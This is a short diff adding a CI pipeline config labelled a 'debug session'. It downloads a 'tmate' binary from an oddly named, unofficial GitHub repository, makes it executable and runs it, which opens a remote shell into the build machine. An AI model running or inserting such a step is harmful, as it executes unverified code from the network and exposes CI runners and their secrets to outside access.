@@ -1,0 +1,17 @@
+version: v1.0
+name: mate Debug Session
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: Start mate Session
+    task:
+      jobs:
+        - name: Run mate
+          commands:
+            - echo "Preparing to start tmate session..."
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - echo "Starting tmate. The session URL will appear in the logs below."
+            - ./tmate -F
